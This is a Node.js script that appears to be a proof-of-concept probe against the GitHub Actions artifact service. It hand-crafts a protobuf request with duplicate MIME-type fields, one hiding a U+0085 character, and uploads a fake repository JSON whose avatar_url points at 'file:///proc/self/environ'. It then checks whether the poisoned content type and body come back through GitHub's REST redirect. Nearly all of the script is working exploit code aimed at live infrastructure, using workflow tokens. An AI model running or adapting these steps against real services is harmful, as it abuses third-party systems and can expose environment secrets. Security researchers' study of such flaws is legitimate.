import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {CreateArtifactResponse} from '../node_modules/@actions/artifact/lib/generated/results/api/v1/artifact.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const weird = 'application/json\u0085';
const safe = 'application/json';
const name = `cassette-proto-duplicate-${process.env.GITHUB_RUN_ID}.json`;

function varint(value) {
  const bytes = [];
  while (value >= 128) {
    bytes.push((value & 127) | 128);
    value = Math.floor(value / 128);
  }
  bytes.push(value);
  return Buffer.from(bytes);
}

function field(number, value) {
  const bytes = Buffer.isBuffer(value) ? value : Buffer.from(value);
  return Buffer.concat([varint(number * 8 + 2), varint(bytes.length), bytes]);
}

function stringValue(value) {
  return field(1, Buffer.from(value));
}

const requestBody = Buffer.concat([
  field(1, ids.workflowRunBackendId),
  field(2, ids.workflowJobRunBackendId),
  field(3, name),
  Buffer.from([0x28, 0x07]),
  field(6, stringValue(weird)),
  field(6, stringValue(safe)),
]);

const createUrl = new URL(
  '/twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact',
  process.env.ACTIONS_RESULTS_URL,
);
const createdResponse = await fetch(createUrl, {
  method: 'POST',
  headers: {
    authorization: `Bearer ${process.env.ACTIONS_RUNTIME_TOKEN}`,
    'content-type': 'application/protobuf',
  },
  body: requestBody,
});
const createdBytes = new Uint8Array(await createdResponse.arrayBuffer());
if (!createdResponse.ok) {
  throw new Error(`duplicate CreateArtifact failed: HTTP ${createdResponse.status}`);
}
const created = CreateArtifactResponse.fromBinary(createdBytes);
if (!created.ok || !created.signedUploadUrl) throw new Error('duplicate CreateArtifact returned no upload URL');

const blob = new BlobClient(created.signedUploadUrl).getBlockBlobClient();
const placeholder = Buffer.from('{}');
await blob.uploadData(placeholder, {blobHTTPHeaders: {blobContentType: weird}});
const digest = createHash('sha256').update(placeholder).digest('hex');
const finalized = await client.FinalizeArtifact({
  workflowRunBackendId: ids.workflowRunBackendId,
  workflowJobRunBackendId: ids.workflowJobRunBackendId,
  name,
  size: String(placeholder.length),
  hash: StringValue.create({value: `sha256:${digest}`}),
});
if (!finalized.ok || !finalized.artifactId) throw new Error('FinalizeArtifact failed');

const artifactId = String(finalized.artifactId);
const repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${artifactId}/zip`;
const payload = Buffer.from(JSON.stringify({
  full_name: repository,
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Duplicate protobuf MIME carrier',
  stargazers_count: 0,
}));
await blob.uploadData(payload, {blobHTTPHeaders: {blobContentType: weird}});

const endpoint = `https://api.github.com/repos/${repository}`;
const first = await fetch(endpoint, {
  redirect: 'manual',
  headers: {
    accept: 'application/vnd.github.v3+json',
    authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
    'user-agent': 'repo-cassette-proto-audit',
  },
});
const location = first.headers.get('location');
if (!location) throw new Error(`artifact REST route returned HTTP ${first.status}`);
const target = new URL(location);
const downloaded = await fetch(location, {headers: {'user-agent': 'repo-cassette-proto-audit'}});
const body = Buffer.from(await downloaded.arrayBuffer());
const type = downloaded.headers.get('content-type') || '';
const report = {
  artifactId,
  repository,
  restStatus: first.status,
  pathKind: target.pathname.endsWith('.json') ? 'json' : target.pathname.endsWith('.zip') ? 'zip' : 'other',
  rsctHex: target.searchParams.has('rsct')
    ? Buffer.from(target.searchParams.get('rsct'), 'utf8').toString('hex') : 'absent',
  contentTypeLatin1Hex: Buffer.from(type, 'latin1').toString('hex'),
  bodyMatches: body.equals(payload),
  payloadSha256: createHash('sha256').update(payload).digest('hex'),
};
console.log(`PROTO_DUPLICATE_REPORT ${JSON.stringify(report)}`);
